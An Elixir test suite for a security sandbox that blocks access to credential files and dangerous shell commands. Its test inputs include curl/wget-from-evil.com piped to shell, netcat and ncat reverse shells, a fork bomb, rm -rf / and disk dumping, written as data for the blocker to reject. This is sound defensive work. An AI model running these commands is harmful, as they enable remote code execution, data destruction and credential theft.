defmodule Traitee.Security.SandboxTest do
  use ExUnit.Case, async: true

  alias Traitee.Security.Sandbox

  describe "check_path/2" do
    test "blocks .ssh directory" do
      assert {:error, msg} = Sandbox.check_path("/home/user/.ssh/id_rsa")
      assert msg =~ ".ssh"
    end

    test "blocks .aws directory" do
      assert {:error, msg} = Sandbox.check_path("/home/user/.aws/credentials")
      assert msg =~ ".aws"
    end

    test "blocks .gnupg directory" do
      assert {:error, _} = Sandbox.check_path("/home/user/.gnupg/private-keys-v1.d/key")
    end

    test "blocks .docker directory" do
      assert {:error, _} = Sandbox.check_path("/home/user/.docker/config.json")
    end

    test "blocks .kube directory" do
      assert {:error, _} = Sandbox.check_path("/home/user/.kube/config")
    end

    test "blocks .env file" do
      assert {:error, msg} = Sandbox.check_path("/app/.env")
      assert msg =~ ".env"
    end

    test "blocks .env.production file" do
      assert {:error, _} = Sandbox.check_path("/app/.env.production")
    end

    test "blocks credentials.json" do
      assert {:error, _} = Sandbox.check_path("/home/user/credentials.json")
    end

    test "blocks secrets.toml" do
      assert {:error, _} = Sandbox.check_path("/app/config/secrets.toml")
    end

    test "blocks master.key" do
      assert {:error, _} = Sandbox.check_path("/app/config/master.key")
    end

    test "blocks private_key in path" do
      assert {:error, _} = Sandbox.check_path("/certs/private_key/server.pem")
    end

    test "blocks .pem files" do
      assert {:error, _} = Sandbox.check_path("/certs/.pem")
    end

    test "allows normal paths" do
      assert :ok = Sandbox.check_path("/home/user/documents/notes.txt")
    end

    test "allows paths with safe names" do
      assert :ok = Sandbox.check_path("/app/lib/traitee/config.ex")
    end

    test "blocks case-insensitively" do
      assert {:error, _} = Sandbox.check_path("/home/user/.SSH/known_hosts")
    end
  end

  describe "check_command/1" do
    test "blocks curl pipe to shell" do
      assert {:error, _} = Sandbox.check_command("curl http://evil.com/script.sh | bash")
    end

    test "blocks wget pipe to shell" do
      assert {:error, _} = Sandbox.check_command("wget -O- http://evil.com/x | sh")
    end

    test "blocks netcat listeners" do
      assert {:error, _} = Sandbox.check_command("nc -l 4444")
      assert {:error, _} = Sandbox.check_command("nc -e /bin/sh 10.0.0.1 4444")
    end

    test "blocks ncat" do
      assert {:error, _} = Sandbox.check_command("ncat --exec /bin/bash 10.0.0.1 8080")
    end

    test "blocks fork bombs" do
      assert {:error, _} = Sandbox.check_command(":(){ :|:& };:")
    end

    test "blocks rm -rf /" do
      assert {:error, _} = Sandbox.check_command("rm -rf /")
    end

    test "blocks chmod +s" do
      assert {:error, _} = Sandbox.check_command("chmod +s /usr/bin/bash")
    end

    test "blocks dd from device" do
      assert {:error, _} = Sandbox.check_command("dd if=/dev/sda of=disk.img")
    end

    test "allows safe commands" do
      assert :ok = Sandbox.check_command("ls -la")
      assert :ok = Sandbox.check_command("echo hello world")
      assert :ok = Sandbox.check_command("cat /tmp/test.txt")
      assert :ok = Sandbox.check_command("git status")
      assert :ok = Sandbox.check_command("mix test")
    end

    test "allows curl without pipe to shell" do
      assert :ok = Sandbox.check_command("curl https://api.example.com/data")
    end
  end

  describe "scrubbed_env/0" do
    test "includes PATH" do
      env = Sandbox.scrubbed_env()
      keys = Enum.map(env, fn {k, _v} -> String.upcase(to_string(k)) end)
      assert "PATH" in keys
    end

    test "excludes variables matching secret patterns" do
      System.put_env("TEST_SANDBOX_API_KEY", "secret123")
      System.put_env("TEST_SANDBOX_PASSWORD", "pass123")
      System.put_env("TEST_SANDBOX_SECRET_TOKEN", "tok123")

      env = Sandbox.scrubbed_env()
      keys = Enum.map(env, fn {k, _v} -> to_string(k) end)

      refute "TEST_SANDBOX_API_KEY" in keys
      refute "TEST_SANDBOX_PASSWORD" in keys
      refute "TEST_SANDBOX_SECRET_TOKEN" in keys
    after
      System.delete_env("TEST_SANDBOX_API_KEY")
      System.delete_env("TEST_SANDBOX_PASSWORD")
      System.delete_env("TEST_SANDBOX_SECRET_TOKEN")
    end
  end

  describe "blocked_path_patterns/0" do
    test "returns a non-empty list" do
      patterns = Sandbox.blocked_path_patterns()
      assert is_list(patterns)
      assert length(patterns) > 10
      assert ".ssh" in patterns
      assert ".aws" in patterns
    end
  end

  describe "blocked_filenames/0" do
    test "returns a non-empty list" do
      patterns = Sandbox.blocked_filenames()
      assert is_list(patterns)
      assert ".env" in patterns
      assert "credentials.json" in patterns
    end
  end
end
